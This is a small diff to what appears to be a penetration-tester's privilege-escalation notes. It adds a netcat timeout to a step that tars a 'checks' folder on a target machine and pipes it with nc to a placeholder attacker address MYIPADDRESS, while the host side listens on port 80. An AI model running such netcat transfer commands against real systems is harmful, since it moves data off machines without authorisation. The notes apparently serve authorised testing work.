@@ -450,7 +450,7 @@ Host:
 cd /root/Dropbox/Engagments/INSERTIPADDRESS/privesc; nc -lvnp 80 > checks.tar.gz
 
 Target:
-tar -zcvf checks.tar.gz checks ;nc -nv MYIPADDRESS 80 < checks.tar.gz
+tar -zcvf checks.tar.gz checks ;nc -w 3 MYIPADDRESS 80 < checks.tar.gz
 
 Host:
 tar xvzf checks.tar.gz
